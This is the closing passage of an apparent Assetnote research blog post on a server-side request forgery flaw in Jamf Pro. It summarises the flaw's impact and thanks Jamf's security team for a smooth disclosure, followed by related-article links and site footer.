While there were more instances of SSRF within Jamf Pro, the one discussed in this blog post had the most impact as the full HTTP response was returned for arbitrary URLs. Even though this vulnerability affected a component only available once authenticated to Jamf Pro, it had significant impact due to the architectural decisions of Jamf Cloud.

The Jamf security team had an excellent response to this vulnerability and we encourage others to report any security issues to Jamf. They went above and beyond when dealing with this disclosure and were a pleasure to work with.

```
Written by:Shubham Shah
```

```

```

```

```

```

Your subscription could not be saved. Please try again.

Your subscription has been successful.

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com

SUBSCRIBE

### More Like This

[Security ResearchNew!
### How an obscure PHP footgun led to RCE in Craft CMS

Read more

Read on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)[Security ResearchNew!
### Citrix Denial of Service: Analysis of CVE-2024-8534

Read more

Read on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)[Security ResearchNew!
### Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.x

Read more

Read on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)[Security ResearchNew!
### Insecurity through Censorship: Vulnerabilities Caused by The Great Firewall

Read more

Read on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)[Security ResearchNew!
### Chaining Three Bugs to Access All Your ServiceNow Data

Read more

Read on ASN Blog](/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data)[Security ResearchNew!
### Why nested deserialization is harmful: Magento XXE (CVE-2024-34102)

Read more

Read on ASN Blog](/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102)[Back to All](/resources/research)
### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

Request a Demo

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)Address:
Level 10, 12 Creek Street, Brisbane QLD, 4000
â
Contact:contact@assetnote.ioPress Inquiries:press@assetnote.io![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)Platform Features[Continuous Asset Discovery](/platform/asset-discovery)[Deep Asset Enrichment](/platform/asset-enrichment)[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)[Expert Security Research](/platform/expert-security-research)[Collaborative Workflows](/platform/collaborative-workflows)[Customization](/platform/customization)Use Cases[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)[Attack Surface Reduction](/use-cases/attack-surface-reduction)[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)Â© 2024 Assetnote. All rights reserved.[Privacy Policy](https://assetnote.io/policies/privacy-policy)


